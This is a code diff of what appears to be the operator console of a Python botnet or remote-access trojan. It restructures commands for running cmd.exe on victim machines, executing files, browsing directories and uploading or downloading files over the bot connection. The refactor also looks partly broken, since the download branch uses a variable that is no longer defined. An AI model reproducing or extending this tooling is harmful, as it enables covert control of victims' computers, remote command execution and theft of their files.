@@ -56,46 +56,40 @@ def run_session(sockfd,mode, input_string, cid_int, infoFor):
                 except Exception as e:
                     print("Error : {error}.".format(error=str(e)))
                 
-            elif(sinput == "filesystem" or sinput == "fs"):
-                browse = True
-                while(browse):
-                    try:
-                        io = input("$ ")
-                        if(io == "help"):
-                            print("exit - Exit FSConsole.\nls - List files in current folder.\ncd <dir> - Change directory.\nupload - Upload a file.\ndownload <filename> - Download a file.")
-                        else:
-                            param = io.split()
-                            if(io.startswith("cd")):
-                                try:
-                                    SendData("cd="+param[1])
-                                except IndexError:
-                                    print("[x] USAGE : cd < Directory >")
-                            elif(io == "ls"):
-                                SendData("ls")
-                            elif(io == "exit"):
-                                browse = False
-                                print("[+] FSConsole exited.")
-                            elif(io == "exec"):
-                                filename = input("-> Enter filename to Execute : ")
-                                if(len(filename) > 0):
-                                    SendData("exec="+filename)
+            elif(sinput == "ls"):
+                SendData("ls")
+            elif(sinput == "exit"):
+                browse = False
+                print("[+] FSConsole exited.")
+            elif(sinput == "exec"):
+                filename = input("-> Enter filename to Execute : ")
+                if(len(filename) > 0):
+                    SendData("exec="+filename)
 
-                            elif(io.startswith("download")):
-                                try:
-                                    todownload = param[1]
-                                    askd = input("-> Confirm download file '{file}' .. ? (y/N): ".format(file=todownload))
-                                    askd = askd.lower()
-                                    if(askd == "y"):
-                                        SendData("sendme="+todownload)
-                                except IndexError: 
-                                    print("[x] USAGE : download <filename>")
-                            elif(io == "upload"):
-                                filetransfer()
-                    except KeyboardInterrupt:
-                        browse = False
-                        print("[+] FSConsole exited.")
+            elif(sinput.startswith("download")):
+                try:
+                    todownload = param[1]
+                    askd = input("-> Confirm download file '{file}' .. ? (y/N): ".format(file=todownload))
+                    askd = askd.lower()
+                    if(askd == "y"):
+                        SendData("sendme="+todownload)
+                except IndexError: 
+                    print("[x] USAGE : download <filename>")
+            elif(sinput == "upload"):
+                filetransfer()
                         
+            elif(sinput.startswith("cd")):
+                try:
+                    param = sinput.split()
+                    if(param[1] == "-s"):
+                        directory = input("-> Enter Directory name : ")
+                        SendData("cd="+directory)
+                    else:
+                        SendData("cd="+param[1])
 
+                except IndexError:
+                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] USAGE : cd < Directory >")
+                    
             elif(sinput == "cmd"):
                 cmd = input("[+] Enter Command : cmd.exe /c ")
                 if(len(cmd) > 0):
@@ -108,8 +102,11 @@ def run_session(sockfd,mode, input_string, cid_int, infoFor):
                 (1). botinfo - View Botinfo
                 (2). msgbox - Send messagebox.
                 (3). send < data > - Send a command directly.
-                (4). filesystem - Browse the system, download/upload and execute files.
-                (5). cmd - Only Execute a Command on the System, No output is returned.
+                (4). cmd - Only Execute a Command on the System, No output is returned.
+                (5). upload - Upload a file.
+                (6). download - Download a file.
+                (7). cd < dir > - Change directories. (Use -s switch to specify directory name with spaces)
+                (8). ls - List files in current directory.
 
                 Use with Send
                 =============
